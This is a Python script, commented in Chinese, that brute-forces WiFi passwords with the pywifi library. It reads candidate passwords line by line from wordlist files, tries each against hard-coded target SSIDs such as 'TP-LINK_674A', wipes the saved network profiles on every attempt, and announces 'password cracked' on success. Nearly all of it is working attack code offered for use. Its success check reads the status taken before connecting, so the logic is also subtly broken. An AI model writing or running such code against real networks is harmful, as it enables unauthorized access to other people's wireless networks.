# coding:utf-8
# from pywifi import wifi
import pywifi
from pywifi import const
import time

wifi = pywifi.PyWiFi()  # 抓取网卡接口
ifaces = wifi.interfaces()[0]  # 获取第一个无线网卡
def wifiConnect(pwd,wifiName):
    ifaces.disconnect()  # 断开所有连接
    wifistatus = ifaces.status()
    # if wifistatus == const.IFACE_DISCONNECTED or wifistatus == const.IFACE_INACTIVE :
    if wifistatus in [0,1,2]:
        profile = pywifi.Profile()        # 创建WiFi连接文件
        profile.ssid = wifiName   # 要连接WiFi的名称
        # profile.auth = const.AUTH_ALG_OPEN        # 网卡的开放状态
        # profile.akm.append(const.AKM_TYPE_WPA2PSK) # wifi加密算法,一般wifi加密算法为wps
        # profile.cipher = const.CIPHER_TYPE_CCMP        # 加密单元
        profile.key = pwd # 调用密码
        ifaces.remove_all_network_profiles()# 删除所有连接过的wifi文件
        tep_profile = ifaces.add_network_profile(profile)        # 设定新的连接文件
        ifaces.connect(tep_profile)

        # wifistatus = ifaces.status()
        # print(1111111111111111111111111)
        # time.sleep(22) # wifi连接时间
        print(wifistatus)
        # if ifaces.status() == const.IFACE_CONNECTED:
        if wifistatus in [3,4]:
            return True
        else:
            return False
    else:
        print("已连接")
        print(wifistatus)
        return False

def readPassword(wifiName):    # 读取密码本
    print("开始破解:")
    # 密码本路径
    path = "wifi_txt.txt"
    # 打开文件
    file = open(path, "r")
    while True:
        try:
            # 一行一行读取
            pad = file.readline()
            bool = wifiConnect(pad,wifiName)

            if bool:
                print("密码已破解： ", pad)
                print("WiFi已自动连接！！！")
                break
            else:
                # 跳出当前循环，进行下一次循环
                print("密码破解中....密码校对: ", pad)
        except:
            continue




def read2(wifiName):    # 读取密码本
    print("开始破解:")
    # 密码本路径
    path = "wifi_txt2.txt"
    # 打开文件
    with open(path, "r") as f:
        filelist=f.readlines()
        # print(filelist)
        for list in filelist:
            # print(list.split(" "))
            flist=list.replace("\n","").split(" ")
            pad=flist[len(flist)-1]
            print(pad)
            bool = wifiConnect(pad, wifiName)

            if bool:
                print("密码已破解： ", pad)
                print("WiFi已自动连接！！！")
                break
            else:
                # 跳出当前循环，进行下一次循环
                print("密码破解中....密码校对: ", pad)

# readPassword("Android1")
# read2("Android1")
# read2("TP-LINK_1715")
read2("TP-LINK_674A")


# wifi = pywifi.PyWiFi()  # 抓取网卡接口
# print(wifi)
# ifaces = wifi.interfaces()[0] # 获取第一个无线网卡
# print(ifaces.name())
# ifaces.disconnect()